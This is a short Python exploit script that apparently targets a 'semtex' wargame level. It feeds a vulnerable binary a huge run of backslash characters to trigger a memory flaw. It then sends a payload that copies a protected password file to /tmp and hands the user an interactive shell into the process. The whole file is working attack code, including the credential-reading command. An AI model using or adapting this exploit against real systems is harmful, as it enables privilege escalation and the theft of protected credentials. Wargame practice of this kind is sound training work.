#!/usr/bin/python

import os,sys, subprocess
from subprocess import Popen, PIPE

p = subprocess.Popen("/semtex/vl1b", stdin=PIPE, shell=True )
#p = subprocess.Popen("./t1", stdin=PIPE, shell=True )
pl="cat /etc/semtex_pass/semtex12 > /tmp/semtex12\n"
target=0xF4FFFFFF
i = 0
inc = 0xFFFF
buf="\\"*inc
print "Starting exploitation."
while i < target:
    p.stdin.write(buf)
    if ((i%1000) == 0):
        print "%s / %s (%f%%)" % (i, target, (float(i)/float(target))*100)
    i+=inc
p.stdin.write("A\n")
print "Exploitation complete. Sending payload."
p.stdin.write(pl)
print 'Entering Shell.'
while True:
    tmp=raw_input()
    print "DEBUG: Sending %s" % tmp
    p.stdin.write(tmp+"\n")
